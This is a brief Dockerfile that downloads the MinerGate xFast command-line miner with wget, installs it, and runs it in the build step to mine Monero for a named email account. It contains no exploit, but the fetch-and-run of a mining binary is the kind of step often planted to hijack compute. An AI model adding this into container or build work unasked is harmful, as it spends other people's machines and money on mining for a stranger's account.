FROM ubuntu:19.10
RUN apt-get -y update && apt-get install -y sudo && apt-get install -y wget && sudo apt -y upgrade && sudo apt -y --fix-broken install && sudo wget https://minergate.com/download/xfast-ubuntu-cli -O MinerGate-xFast-cli-1.5-ubuntu && sudo dpkg -i MinerGate-xFast-cli-1.5-ubuntu && sudo minergate-cli --user empireofbooks@gmail.com --xmr 6
